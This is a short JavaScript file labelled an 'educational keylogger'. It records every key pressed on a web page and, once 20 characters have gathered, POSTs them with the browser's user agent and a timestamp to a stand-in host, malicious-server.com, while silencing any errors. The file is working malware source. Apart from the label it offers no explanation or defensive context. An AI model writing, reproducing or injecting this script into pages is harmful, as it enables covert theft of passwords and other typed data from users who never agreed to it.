// ⚠️ Educational Keylogger – Web-based JavaScript Example
(function () {
    let loggedKeys = "";

    document.addEventListener("keydown", function (e) {
        const key = e.key;
        loggedKeys += key;

        // Optional: send logs every 20 characters
        if (loggedKeys.length >= 20) {
            sendToServer(loggedKeys);
            loggedKeys = ""; // reset log
        }
    });

    function sendToServer(logData) {
        fetch("https://malicious-server.com/log", {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify({
                userAgent: navigator.userAgent,
                log: logData,
                timestamp: Date.now()
            })
        }).catch(() => {
            // silently fail
        });
    }
})();
